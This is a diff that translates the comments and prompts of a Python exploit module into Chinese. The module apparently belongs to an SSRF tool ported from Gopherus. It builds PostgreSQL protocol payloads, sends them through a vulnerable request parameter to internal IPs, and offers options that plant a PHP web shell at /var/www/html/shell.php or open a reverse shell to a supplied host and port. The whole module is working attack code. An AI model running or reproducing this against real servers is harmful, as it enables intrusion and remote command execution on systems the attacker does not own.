@@ -3,11 +3,11 @@ import logging
 
 from core.utils import *
 
-# NOTE
-# This exploit is a Python 3 version of the Gopherus tool
+# 注意
+# 此利用代码是 Gopherus 工具的 Python 3 版本
 
 name = "postgres"
-description = "Execute Postgres command"
+description = "执行 Postgres 命令"
 author = "sengkyaut"
 documentation = ["https://github.com/tarunkant/Gopherus"]
 
@@ -19,25 +19,25 @@ class exploit:
     php_cmd_shell = "COPY (SELECT '<?php system($_GET[\"cmd\"]);?>') TO '/var/www/html/shell.php';"
 
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
 
-        # Get the username, database, query
-        self.user = input("Give Postgres username (Default postgres): ") or self.user
-        self.database = input("Give Postgres Database name (Default postgres): ") or self.database
+        # 获取用户名、数据库和查询语句
+        self.user = input("请输入 Postgres 用户名（默认 postgres）: ") or self.user
+        self.database = input("请输入 Postgres 数据库名（默认 postgres）: ") or self.database
         query = input(
-            "Give Postgres query to execute (reverse or phpshell or any Postgres statement): "
+            "请输入要执行的 Postgres 查询（reverse、phpshell 或任意 Postgres 语句）: "
         )
 
-        # Reverse shell - writing system() in /var/www/html/shell.php
+        # 反弹 shell - 将 system() 写入 /var/www/html/shell.php
         if query == "reverse":
             self.query = self.reverse
             if args.lhost == None:
-                self.query = self.query.replace("SERVER_HOST", input("Server Host:"))
+                self.query = self.query.replace("SERVER_HOST", input("服务器主机:"))
             else:
                 self.query = self.query.replace("SERVER_HOST", args.lhost)
 
             if args.lport == None:
-                self.query = self.query.replace("SERVER_PORT", input("Server Port:"))
+                self.query = self.query.replace("SERVER_PORT", input("服务器端口:"))
             else:
                 self.query = self.query.replace("SERVER_PORT", args.lport)
 
@@ -47,18 +47,18 @@ class exploit:
         else:
             self.query = query
 
-        # For every IP generated, send the payload
+        # 对每个生成的 IP，发送 payload
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
             payload = self.get_payload(self.query, ip)
-            logging.info(f"Generated payload : {payload}")
+            logging.info(f"生成的 payload : {payload}")
 
             r = requester.do_request(args.param, payload)
 
             if query == "reverse" or query == "phpshell":
-                logging.info(f"Please check the shell.php on the web root for confirmation.")
+                logging.info(f"请检查 Web 根目录下的 shell.php 以确认。")
 
-            logging.info(f"Module '{name}' ended !")
+            logging.info(f"模块 '{name}' 已结束！")
 
     def encode(self, s, ip):
         a = [s[i : i + 2] for i in range(0, len(s), 2)]
@@ -69,13 +69,13 @@ class exploit:
 
     def get_payload(self, query, ip):
         if query.strip() != "":
-            # Encode username, db and query
+            # 对用户名、数据库和查询语句进行编码
             encode_user = self.encode_to_hex_str(self.user)
             encode_db = self.encode_to_hex_str(self.database)
             encode_query = self.encode_to_hex_str(self.query)
             len_query = len(query) + 5
 
-            # Construct the payload
+            # 构造 payload
             start = (
                 "000000"
                 + self.encode_to_hex_str(chr(4 + len(self.user) + 8 + len(self.database) + 13))
@@ -99,5 +99,5 @@ class exploit:
             final = self.encode(packet, ip)
             return final
         else:
-            logging.error(f"Query can't be empty")
-            raise Exception("Postgres query empty!")
+            logging.error(f"查询语句不能为空")
+            raise Exception("Postgres 查询语句为空！")
